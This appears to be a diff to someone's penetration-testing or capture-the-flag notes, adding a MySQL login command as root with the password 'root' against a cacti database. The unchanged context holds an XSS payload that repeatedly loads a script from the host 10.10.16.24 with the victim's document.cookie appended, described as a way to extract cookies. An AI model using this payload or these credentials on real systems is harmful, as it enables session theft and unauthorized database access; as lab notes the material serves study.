@@ -127,3 +127,9 @@ jsh.py -g
 <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.16.24:4848/?".concat(document.cookie)},1010)</script>
 
 this will get a shell to extract cookies.
+
+### mysql interaction
+
+```
+mysql --host=db --user=root --password=root cacti -e "show table"
+```
